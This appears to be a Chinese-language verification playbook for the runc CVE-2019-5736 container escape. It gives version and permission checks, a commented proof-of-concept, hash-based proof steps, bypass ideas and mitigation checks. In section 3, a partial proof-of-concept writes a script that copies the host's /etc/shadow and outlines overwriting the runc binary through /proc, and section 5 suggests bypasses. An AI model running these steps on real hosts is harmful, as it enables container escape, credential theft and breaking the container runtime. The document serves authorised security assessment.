---
source: manual
confidence: high
platforms: [docker, containerd]
required_tools: []
execution_contexts: [L0, L1, L3]
max_verification_level: L3
destructive: true
mapped_attack_surfaces: [AS-1.4]
mapped_compliance_families: [runc版本过旧, 特权容器]
---

# runc-escape — runc CVE-2019-5736 逃逸

runc 版本低于 1.0-rc91 存在 CVE-2019-5736 漏洞，攻击者可通过覆盖宿主机 runc 二进制文件实现容器逃逸。

---

## 1. 前置条件

- 宿主机 runc 版本 < 1.0-rc91（CVE-2019-5736）
- 攻击者可在容器内执行代码（已有容器内 shell 或可注入命令）
- 容器以 root 用户运行（需覆盖 runc 二进制需要写权限）

检查命令：
```bash
# [L0] 宿主机观察：检查 runc 版本
runc --version
# 期望输出: runc version 1.0.0-rc91 或更低（< 1.0-rc91 = 漏洞版本）

# [L0] 宿主机观察：检查 containerd 版本（containerd 使用 runc）
containerd --version
# 期望输出: 确认 containerd 版本以判断嵌入的 runc 版本

# [L0] 宿主机观察：通过 docker info 检查 runc 版本
docker info | grep -i runc
# 期望输出: runc version 1.0.0-rc90 或更低

# [L1] 容器内观察：确认以 root 运行
kubectl exec -n <ns> <pod-name> -- id
# 期望输出: uid=0(root) ...

# [L1] 容器内观察：确认 runc 路径可被探测
kubectl exec -n <ns> <pod-name> -- ls -la /proc/self/exe
# 期望输出: 指向容器内进程二进制
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：确认 runc 漏洞版本
runc --version 2>/dev/null | head -1
# 期望输出: runc version 1.0.0-rc90 或更低

# [L0] 宿主机观察：检查 runc 二进制路径
which runc
# 期望输出: /usr/bin/runc 或 /usr/local/bin/runc

# [L0] 宿主机观察：检查 runc 二进制权限
ls -la $(which runc)
# 期望输出: -rwxr-xr-x root root（root 可写）

# [L1] 容器内观察：确认容器内进程可通过 /proc/self/exe 访问 runc
kubectl exec -n <ns> <pod-name> -- ls -la /proc/self/exe
# 期望输出: lrwxrwxrwx ... /proc/self/exe -> /usr/bin/<container_process>

# [L1] 容器内观察：确认容器以 root 运行
kubectl exec -n <ns> <pod-name> -- cat /proc/self/status | grep -i uid
# 期望输出: Uid: 0 0 0 0

# [L0] 宿主机观察：检查是否有潘多拉补丁（runc binary 为只读 mount）
mount | grep runc
# 若输出含 ro → 可能已部署缓解措施
```

## 3. 攻击验证

```bash
# [L3] 条件验证（⚠️ 不可安全复现，会覆盖宿主机 runc 二进制导致所有容器不可用）
# 验证级别: L3-条件验证
# 不可安全复现原因: CVE-2019-5736 利用会覆盖宿主机 runc 二进制文件，导致后续所有 docker exec / kubectl exec 失败

# 前置条件满足证明:
# ✅ runc --version 输出 < 1.0-rc91
# ✅ kubectl exec <pod> -- id 输出 uid=0(root)
# ✅ runc binary 权限允许 root 覆盖写入

# ⚠️ POC步骤（理论推导，实际执行会破坏宿主机 runc）：
#
# [L2] 步骤1: 在容器内创建恶意 runc 替换脚本
# kubectl exec -n <ns> <pod-name> -- bash -c '
#   cat > /tmp/evil_runc.sh << "EOF"
#   #!/bin/bash
#   cat /etc/shadow > /tmp/runc_escape_proof
#   EOF
#   chmod +x /tmp/evil_runc.sh
# '
#
# [L2] 步骤2: 利用 CVE-2019-5736 通过 /proc/self/exe 覆盖宿主机 runc
# # 原理：当 docker exec 进入容器时，容器内 /proc/<runc-pid>/exe 指向宿主机 runc 二进制
# # 攻击者通过打开该 fd 并向其写入恶意 payload，覆盖宿主机 runc
# # 下次 docker exec 时会执行恶意代码而非 runc
#
# kubectl exec -n <ns> <pod-name> -- bash -c '
#   # 等待新的 exec 进入容器
#   # 通过 /proc/*/cmdline 找到 runc 进程
#   for pid in /proc/[0-9]*/cmdline; do
#     if grep -q "runc" "$pid" 2>/dev/null; then
#       runc_pid=$(echo "$pid" | cut -d/ -f3)
#       # 打开 /proc/$runc_pid/exe 的 fd 并写入恶意 payload
#       # 实际 POC 需要编译 Go 程序来操作 /proc/$pid/exe
#       echo "Found runc PID: $runc_pid"
#     fi
#   done
# '
#
# [L2] 步骤3: 触发覆盖后的 runc 执行（下次 docker exec 时）
# docker exec <container> echo "trigger"
# 预期影响: 宿主机 runc 被替换为恶意脚本，执行时将 /etc/shadow 复制到 /tmp/runc_escape_proof
#
# [L2] 清理（需要重新安装 runc）：
# apt-get install --reinstall runc  # 或 yum reinstall runc
# rm -f /tmp/runc_escape_proof /tmp/evil_runc.sh
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：记录 runc 二进制哈希
sha256sum $(which runc)
# 期望输出: 原始 runc 二进制哈希值

# [L0] 攻击前环境快照：记录宿主机无逃逸证明文件
ls -la /tmp/runc_escape_proof 2>&1
# 期望输出: No such file or directory

# [L0] 攻击后环境对比：检查 runc 二进制是否被修改
sha256sum $(which runc)
# 期望输出: 哈希值与攻击前不同 → 证明 runc 被覆盖

# [L0] 攻击后环境对比：检查逃逸证明文件
ls -la /tmp/runc_escape_proof 2>&1
# 期望输出: -rw-r--r-- ... /tmp/runc_escape_proof（文件存在 → 证明逃逸成功）

# [L2] 容器内读取宿主机文件证明逃逸成功
cat /tmp/runc_escape_proof 2>/dev/null
# 期望输出: root:$6$...:... (宿主机 /etc/shadow 内容) → 证明逃逸成功

# 清理（需要重新安装 runc 恢复）
# apt-get install --reinstall runc
# rm -f /tmp/runc_escape_proof
```

差分结论：攻击前后 runc 二进制哈希不同，且宿主机 `/tmp` 出现包含 `/etc/shadow` 内容的文件，证明 runc 被覆盖后以 root 在宿主机执行了逃逸命令。

## 5. 绕过策略

```bash
# [L0] 检查 runc 二进制是否被挂载为只读（缓解措施）
mount | grep $(which runc) | grep ro
# 若 runc 以 ro 方式挂载 → 无法覆盖

# [L1] 检查 AppArmor 是否限制 /proc/*/exe 写入
kubectl exec -n <ns> <pod-name> -- cat /proc/1/attr/current
# 若输出含 proc 限制策略 → AppArmor 可能阻断

# 绕过方式：
# - [L2] 若 runc binary 为 ro 挂载但 runc 版本仍旧旧，检查是否有其他 runc 副本不在只读挂载中
# - [L3] 若 root 用户不可直接覆盖 runc，检查是否有 setuid 二进制可以利用
# - [L3] 若 /proc/*/exe 被限制，检查 CVE-2019-5736 的变体利用方式（通过 containerd-shim）
```

## 6. 证伪条件

```bash
# [L0] runc 版本 >= 1.0-rc91（已修补）
runc --version | head -1
# 输出: runc version 1.0.0-rc91 或更高 → 证伪

# [L0] runc 二进制为只读挂载（缓解措施已部署）
mount | grep $(which runc) | grep -c ro
# 输出: 1 → 证伪（无法覆盖）

# [L1] 容器非 root 运行
kubectl exec -n <ns> <pod-name> -- id
# 输出: uid=1000 或其他非 0 → 证伪（无权限覆盖 runc）

# [L0] runc 命令不存在（使用其他 runtime）
which runc 2>&1
# 输出: not found → 证伪（系统中无 runc）
```

## 7. 审批级别

- **L3** 条件验证（理论推导 CVE-2019-5736 利用）→ **Level 5**（会覆盖宿主机 runc 二进制导致所有容器不可用，必须人工确认）
- **L1** 容器内探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：是（覆盖 runc 二进制导致容器运行时不可用）
- 最高验证层级：L3

## 8. MITRE ATT&CK

- **Tactic**: Privilege Escalation
- **Technique ID**: T1068
- **Technique Name**: Exploitation for Privilege Escalation
- **描述**: 攻击者利用 CVE-2019-5736 漏洞，通过容器内 `/proc/self/exe` 访问宿主机 runc 二进制文件并覆写为恶意 payload，当后续 `docker exec` 或 `kubectl exec` 触发 runc 时，在宿主机上以 root 身份执行任意命令，实现容器逃逸。